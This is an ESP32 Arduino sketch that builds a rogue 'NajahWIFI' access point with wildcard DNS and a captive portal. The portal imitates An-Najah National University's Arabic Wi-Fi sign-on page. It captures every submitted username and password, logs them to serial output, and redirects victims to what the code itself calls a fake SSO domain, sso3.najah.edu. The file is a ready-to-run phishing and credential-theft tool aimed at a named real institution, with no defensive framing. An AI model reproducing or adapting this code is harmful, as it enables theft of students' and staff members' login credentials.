#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

// AP settings
const char* ssid = "NajahWIFI";
IPAddress apIP(192, 168, 4, 1); // softAP IP
const byte DNS_PORT = 53;

// Web + DNS servers
WebServer server(80);
DNSServer dnsServer;

//
// HTML page served for "/"
//
const char PAGE[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang='ar'>
<head>
<meta charset='UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'>
<title>An-Najah N. Univ. Wi-Fi</title>
<style>
  html,body{height:100%;margin:0;}
  body {
    font-family: Arial, sans-serif;
    margin:0; padding:0;
    height:100vh;
    background-color: #888888; /* gray fallback */
    display: flex;
    justify-content: center;
    align-items: center;
    color: white;
    direction: rtl;
  }
  .login-container {
    background-color: rgba(0,0,0,0.7);
    padding: 30px 24px;
    border-radius: 10px;
    text-align: center;
    max-width: 380px;
    width: 92%;
    box-sizing: border-box;
  }
  h1 { font-size: 20px; margin-bottom: 14px; }
  input {
    display: block;
    margin: 8px auto;
    padding: 10px;
    width: 92%;
    border-radius: 6px;
    border: none;
    font-size: 15px;
    box-sizing: border-box;
  }
  button {
    padding: 10px 20px;
    border:none;
    border-radius:6px;
    background-color:#ff7f00;
    color:white;
    cursor:pointer;
    font-size:16px;
    width: 96%;
    box-sizing: border-box;
  }
  button:hover { filter: brightness(0.95); }
  p.small { font-size: 12px; margin-top: 10px; color:#ddd; }
  .sso-text { margin-top:12px; font-weight:600; color:#fff; }
</style>
</head>
<body>
  <div class='login-container'>
    <h1>An-Najah N. Univ. Wi‑Fi</h1>
    <form method='POST' action='/'>
      <input type='text' name='username' placeholder='اسم المستخدم' required>
      <input type='password' name='password' placeholder='كلمة المرور' required>
      <button type='submit'>تسجيل الدخول</button>
    </form>

    <p class='small'>اتصل بأحد الموظفين إذا كنت تعاني من صعوبة في تسجيل الدخول</p>

    <!-- displayed as plain text (not clickable) -->
    <p class='sso-text'>URL: sso3.najah.edu</p>

    <p class='small'>&copy; 2025</p>
  </div>
</body>
</html>
)rawliteral";

void handleRoot() {
  // if a POST (form submit) - read args and log to Serial
  if (server.method() == HTTP_POST) {
    String username = server.arg("username");
    String password = server.arg("password");
    Serial.print("[LOGIN] Username: "); Serial.println(username);
    Serial.print("[LOGIN] Password: "); Serial.println(password);

    // simple response: redirect back to root (so address bar stays sso3.najah.edu)
    server.sendHeader("Location", "http://sso3.najah.edu/", true);
    server.send(303, "text/plain", "");
    return;
  }

  // GET -> serve the login page
  server.send_P(200, "text/html", PAGE);
}

void handleNotFound() {
  // redirect everything to the fake SSO domain (so browser shows sso3.najah.edu)
  // using absolute URL helps browsers put it in the address/search bar
  server.sendHeader("Location", "http://sso3.najah.edu/", true);
  server.send(302, "text/plain", "");
}

void setup() {
  Serial.begin(115200);
  delay(100);

  // Stop any previous AP + DNS
  WiFi.softAPdisconnect(true);

  // Configure softAP ip/gateway/netmask
  WiFi.softAPConfig(apIP, apIP, IPAddress(255,255,255,0));
  WiFi.softAP(ssid);
  Serial.print("AP started: ");
  Serial.println(ssid);
  Serial.print("AP IP: ");
  Serial.println(WiFi.softAPIP());

  // Start DNS server.
  // Using "*" makes the ESP pretend to be the DNS for any hostnames the client asks for.
  // Combined with redirect below, browsers will display the chosen domain.
  dnsServer.start(DNS_PORT, "*", apIP);

  // HTTP handlers
  server.on("/", HTTP_GET, handleRoot);
  server.on("/", HTTP_POST, handleRoot);
  server.onNotFound(handleNotFound);

  server.begin();
  Serial.println("HTTP server started");
}

void loop() {
  dnsServer.processNextRequest(); // handle DNS queries
  server.handleClient();          // handle HTTP clients
  delay(1);
}
